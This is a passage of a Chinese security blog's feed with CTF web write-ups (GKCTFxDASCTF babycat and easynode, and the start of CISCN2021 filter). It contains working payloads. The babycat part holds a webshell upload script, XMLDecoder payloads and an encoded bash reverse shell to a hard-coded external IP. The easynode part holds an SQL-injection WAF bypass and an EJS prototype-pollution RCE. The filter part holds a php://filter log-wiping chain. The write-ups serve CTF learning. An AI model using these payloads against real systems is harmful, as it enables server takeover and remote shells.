    <category term="nosql" scheme="https://123-prog.github.io/categories/CTF/nosql/"/>
    
    
    <category term="nosql注入" scheme="https://123-prog.github.io/tags/nosql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>GKCTFxDASCTF web部分复现</title>
    <link href="https://123-prog.github.io/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <id>https://123-prog.github.io/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-08-09T09:24:33.000Z</published>
    <updated>2021-09-22T10:19:23.557Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-babycat"><a href="#0x01-babycat" class="headerlink" title="0x01 babycat"></a>0x01 babycat</h3><p>这题出了非预期，非预期就直接传马，没有任何过滤</p><a id="more"></a><p>注册个账号，提示<code>Not Allowed</code>，这里存在逻辑漏洞，右键源码看到直接post数据可以注册</p><p><img src="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/Snipaste_2021-08-09_17-34-33.png"></p><p><img src="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/Snipaste_2021-08-09_17-36-14.png"></p><p>登录后可以在<code>/home/download</code>处下载任意代码，读取<code>web.xml</code>，得知包的结构，可以下载class文件，反编译就可以得到源码</p><p>例如<code>/home/download?file=../classes/com/web/servlet/uploadServlet.class</code></p><p>upload路由的post方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(req)) &#123;</span><br><span class="line">            req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(&#x27;something wrong&#x27;);history.back(-1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">            req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/error.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">        factory.setSizeThreshold(<span class="number">3145728</span>);</span><br><span class="line">        factory.setRepository(<span class="keyword">new</span> File(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)));</span><br><span class="line">        ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line">        upload.setFileSizeMax(<span class="number">41943040L</span>);</span><br><span class="line">        upload.setSizeMax(<span class="number">52428800L</span>);</span><br><span class="line">        String uploadPath = System.getenv(<span class="string">&quot;CATALINA_HOME&quot;</span>) + <span class="string">&quot;/webapps/ROOT/WEB-INF/upload/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;FileItem&gt; formItems = upload.parseRequest(req);</span><br><span class="line">            <span class="keyword">if</span> (formItems != <span class="keyword">null</span> &amp;&amp; formItems.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                Iterator var7 = formItems.iterator();</span><br><span class="line"></span><br><span class="line">                label34:</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    FileItem item;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!var7.hasNext()) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label34;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        item = (FileItem)var7.next();</span><br><span class="line">                    &#125; <span class="keyword">while</span>(item.isFormField());</span><br><span class="line"></span><br><span class="line">                    String fileName = item.getName();</span><br><span class="line">                    String ext = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>)).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    String name = fileName.replace(ext, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (checkExt(ext) || checkContent(item.getInputStream())) &#123;</span><br><span class="line">                        req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">                        req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String filePath = uploadPath + File.separator + name + ext;</span><br><span class="line">                    File storeFile = <span class="keyword">new</span> File(filePath);</span><br><span class="line">                    item.write(storeFile);</span><br><span class="line">                    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload success!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">            req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(&#x27;something wrong&#x27;);history.back(-1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>并没有对身份进行验证，过滤文件内容和后缀的判断后没有return，后面的代码照样执行，过滤了个寂寞</p><p>上传马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;shell.jsp&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line"></span><br><span class="line">loginData = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loginUrl = <span class="string">&#x27;http://05d055c0-bfda-4c70-bd28-a331d01d153a.node4.buuoj.cn:81/login&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://05d055c0-bfda-4c70-bd28-a331d01d153a.node4.buuoj.cn:81/home/upload&#x27;</span></span><br><span class="line"></span><br><span class="line">r = s.post(loginUrl,data=&#123;<span class="string">&quot;data&quot;</span>:json.dumps(loginData)&#125;)</span><br><span class="line">r1 = s.post(url,files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;../../static/shell.jsp&quot;</span>,data)&#125;)</span><br></pre></td></tr></table></figure><p>往<code>static</code>目录写马，拿flag</p><p><img src="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/Snipaste_2021-08-09_17-45-51.png"></p><p><strong>预期解：</strong></p><p>首先要成为admin，才能上传文件，在注册类中可以发现，注册时会匹配这样的正则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;role&quot;:&quot;(.*?)&quot;</span><br></pre></td></tr></table></figure><p>并会将最后的匹配替换成<code>&quot;role&quot;:&quot;guest&quot;</code>，绕过payload，使用注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;&#123;&quot;username&quot;:&quot;xxx&quot;,&quot;password&quot;:&quot;xxx&quot;,&quot;role&quot;:&quot;admin&quot;&#x2F;*,&quot;role&quot;:&quot;xxx&quot;*&#x2F;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/Snipaste_2021-08-09_21-46-34.png"></p><p><img src="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/Snipaste_2021-08-09_21-46-37.png"></p><p>上传文件有过滤后缀和内容，允许上传xml文件</p><p>结合在操作数据库的<code>com.web.dao.baseDao</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = (<span class="keyword">new</span> XMLDecoder(<span class="keyword">new</span> FileInputStream(System.getenv(<span class="string">&quot;CATALINA_HOME&quot;</span>) + <span class="string">&quot;/webapps/ROOT/WEB-INF/db/db.xml&quot;</span>))).readObject();</span><br></pre></td></tr></table></figure><p>直接读取db.xml并传入<code>XMLDecoder</code>进行解析，这里可以往db.xml写恶意xml</p><p>过滤了xml文件内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] blackList = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;ProcessBuilder&quot;</span>, <span class="string">&quot;jdbc&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>根据提示，使用<code>PrintWriter</code>写shell，需要绝对路径，可以读环境变量获取</p><p>Runtime在黑名单里面，可以先用任意写文件的马，将jsp内容写进指定文件，触发一次XMLDecoder就可以，登录或注册都可以触发</p><p><code>&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;java version&#x3D;&quot;1.8.0_192&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt; </span><br><span class="line">&lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">&lt;string&gt;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;static&#x2F;shell.jsp&lt;&#x2F;string&gt;&lt;void</span><br><span class="line">method&#x3D;&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;![CDATA[&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt;]]&gt;</span><br><span class="line">&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;&lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;object&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;![CDATA[这里的内容不会被xml解析器解析，可以避免一些麻烦]]&gt;</code></p><p>实现任意写文件，再写命令执行马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;static&#x2F;shell.jsp?f&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;static&#x2F;c4t.jsp&amp;c&#x3D;&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;static&#x2F;c4t.jsp?i&#x3D;bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D</span><br></pre></td></tr></table></figure><p>反弹shell的命令可以在<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E7%BC%96%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%60Runtime.getRuntime().exec()%60%E6%9C%89%E4%BA%9Bshell%E7%9A%84%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E5%AE%83%E4%B8%8D%E8%A7%A3%E9%87%8A">http://www.jackson-t.ca/runtime-exec-payloads.html这个工具编码一下，`Runtime.getRuntime().exec()`有些shell的特殊符号它不解释</a></p><p><img src="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/Snipaste_2021-08-10_12-36-22.png"></p><p>或者不用<code>PrintWriter</code>，用xml实体编码就可以绕过对<code>ProcessBuilder</code>的过滤，所以恶意的xml也可以是</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.<span class="symbol">&amp;#80;</span>rocessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后注册触发xml解析就可以拿到shell</p><h3 id="0x02-easynode"><a href="#0x02-easynode" class="headerlink" title="0x02 easynode"></a>0x02 easynode</h3><p>首先是登录，看源码，是sql注入，但过滤很严格，貌似不可以逃逸出引号实现注入，但其实这里的waf有漏洞</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> waf = <span class="function">(<span class="params">str</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">// console.log(str);</span></span><br><span class="line">        blacklist = [<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line">        blacklist.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (str == element)&#123;</span><br><span class="line">                str = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> safeStr = <span class="function">(<span class="params">str</span>)=&gt;</span>&#123; <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; str.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (waf(str[i]) ==<span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            str =  str.slice(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + str.slice(i + <span class="number">1</span>, str.length);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = safeStr(username);</span><br><span class="line">    password = safeStr(password);</span><br><span class="line">    <span class="keyword">let</span> sql = format(<span class="string">&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;</span>,username.substr(<span class="number">0</span>,<span class="number">20</span>),password.substr(<span class="number">0</span>,<span class="number">20</span>));</span><br></pre></td></tr></table></figure><p>waf是把传入的username逐个与黑名单进行比较，可以传入数组进行绕过，但后面substr只能是字符串，所以我们的数组中还得出现一次黑名单的字符，通过这句语句<code>str =  str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length);</code>将一个数组转化成字符串</p><p>但得注意的是，safe中的循环次数是根据str长度来的，str从数组变成字符串，长度会发生改变，之后循环还会继续，此时就要保证循环继续之后，不会被waf，可以拉长数组长度，使得在转变成字符串的时候，i值够大，不会影响到我们的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username &#x3D; [&quot;admin&#39;#&quot;,1,1,1,1,&quot;(&quot;]</span><br></pre></td></tr></table></figure><p>post</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[]&#x3D;admin&#39;#&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;(&amp;password&#x3D;xxx</span><br></pre></td></tr></table></figure><p>拿到token值</p><p>后面就是一个原型链污染到ejs模块实现RCE</p><p>在<code>/adminDIV</code>下</p><p><img src="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/Snipaste_2021-08-11_21-16-55.png"></p><p>出现了可控的键值</p><p>注册一个名为<code>__proto__</code>的用户（用admin的token注册），登录拿到token，在<code>/adminDIV</code>提交污染数据</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);//&quot;&#125;</span><br></pre></td></tr></table></figure><p>污染到ejs中的<code>outputFunctionName</code>，在渲染之后，可实现RCE</p><p>参考<a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><p>回到<code>/admin</code>路由，渲染时直接触发RCE</p><p><img src="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/Snipaste_2021-08-11_22-07-39.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-babycat&quot;&gt;&lt;a href=&quot;#0x01-babycat&quot; class=&quot;headerlink&quot; title=&quot;0x01 babycat&quot;&gt;&lt;/a&gt;0x01 babycat&lt;/h3&gt;&lt;p&gt;这题出了非预期，非预期就直接传马，没有任何过滤&lt;/p&gt;</summary>
    
    
    
    <category term="wp" scheme="https://123-prog.github.io/categories/wp/"/>
    
    
    <category term="杂记" scheme="https://123-prog.github.io/tags/%E6%9D%82%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>(CISCN2021 Quals)filter</title>
    <link href="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/"/>
    <id>https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/</id>
    <published>2021-08-05T02:42:14.000Z</published>
    <updated>2021-09-22T10:18:45.763Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>给了<code>site</code>控制器的源码，就改了index方法的那一部分</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$file</span> = Yii::<span class="variable">$app</span>-&gt;request-&gt;get(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">       <span class="variable">$res</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">       file_put_contents(<span class="variable">$file</span>,<span class="variable">$res</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>读取文件内容，再将读取到的内容写到文件中，看似我们无法控制其中的内容，实际上可以通过<code>php://filter</code>过滤数据，再通过巧妙地构造实现在指定文件中写入想要的内容，具体看下面</p><p>首先，需要知道一个目标文件路径</p><p>根据提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;log&#x27;</span> =&gt; [</span><br><span class="line">           <span class="string">&#x27;traceLevel&#x27;</span> =&gt; YII_DEBUG ? <span class="number">0</span> : <span class="number">0</span>,</span><br><span class="line">           <span class="string">&#x27;targets&#x27;</span> =&gt; [</span><br><span class="line">               [</span><br><span class="line">                   <span class="string">&#x27;class&#x27;</span> =&gt; <span class="string">&#x27;yii\log\FileTarget&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;levels&#x27;</span> =&gt; [<span class="string">&#x27;error&#x27;</span>],</span><br><span class="line">                   <span class="string">&#x27;logVars&#x27;</span> =&gt; [],</span><br><span class="line">               ],</span><br><span class="line">           ],</span><br><span class="line">       ],</span><br></pre></td></tr></table></figure><p><code>&#39;class&#39; =&gt; &#39;yii\log\FileTarget&#39;</code>指定日志使用文件存储，没有指定存储目标文件，默认在目录</p><p><code>/runtime/logs/app.log</code></p><p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_17-34-11.png"></p><p>目标文件就是这个日志文件</p><h3 id="0x02-php-filter清空文件内容"><a href="#0x02-php-filter清空文件内容" class="headerlink" title="0x02 php://filter清空文件内容"></a>0x02 php://filter清空文件内容</h3><p>首先，清空主要是利用<code>convert.base64-decode</code>解码的时候会先将非base64编码表里面的字符清除，只要将日志的内容转换为非base64编码表中的字符，就可以实现清除的目的</p><p>利用转化编码的方式可以将日志中的字符转换成一些编码值较大的字符，这些字符不会出现在base64编码表中</p><p>主要的<code>filter</code>过滤流为</p><p><code>php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</code>，通过<code>file_put_contents()</code>将读出的数据通过write流（得到空）再写入文件</p><p>分析：</p><ol><li><code>convert.iconv.utf-8.utf-16be</code>可以将字符的编码从<code>utf-8转换到utf-16be</code>，be代表大端序，对应le代表小端序，比如，utf-8下的<code>t</code>对应<code>74</code>，经过这一转换，就变成了<code>0074</code>  <img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_13-54-41.png"></li><li><code>convert.quoted-printable-encode</code>，打印出所有字符，包括不可见字符，会穿插等于号在其中作为标志，为什么要用这个呢，下面看一下，经过这个流打印出的字符，已经没有不可见字符，而且观察一下，如果作为utf-16来看，两个字节一个字符，这些表示的字符编码值都很高，会是一些语言符号，可能是中文或者其他语言，但它都不会在base64编码表里<img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_13-59-37.png"></li><li>将上面得到的字符再做个编码转换，回到<code>utf-8</code>，<code>convert.iconv.utf-16be.utf-8</code>，会得到这些字符<img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_21-14-45.png"></li><li>最后base64-decode直接清空</li></ol><p>其实多次<code>base64-decode</code>也是可以清空的</p><h3 id="0x03-构造phar触发反序列化"><a href="#0x03-构造phar触发反序列化" class="headerlink" title="0x03 构造phar触发反序列化"></a>0x03 构造phar触发反序列化</h3><p>我们可以在日志控制的部分，无非就是某个不存在的目录或文件参数，我们访问这个不存在的参数，这题<code>file</code>参数就是这样的参数，如果给出不存在的路径，自然会在日志中反映出来</p><p>在本地搭个环境，利用<code>composer</code>搭</p><p>然后把本地环境的配置改一下，控制器改一下，改成跟题目一致就可以了</p><h5 id="给出一个不存在参数"><a href="#给出一个不存在参数" class="headerlink" title="给出一个不存在参数"></a>给出一个不存在参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?r&#x3D;site&#x2F;index&amp;file&#x3D;PPOOCC</span><br></pre></td></tr></table></figure><p>日志中出现一条错误信息</p><p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_17-45-48.png"></p><p>有两处可以出现我们的payload，但这里的第二处栈信息中，只会显示15个字符，超过直接省略号给你省略了，这里是一个点需要注意的，这里的省略需要做处理，否则截断在第15个字符，可能对后面的解码转码造成影响</p><p>下面开始消除日志payload外的其他字符，方法是，<strong>对payload进行编码转码后再插入，然后在对payload进行还原的同时，清除其他字符</strong></p><p>读取流可以是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 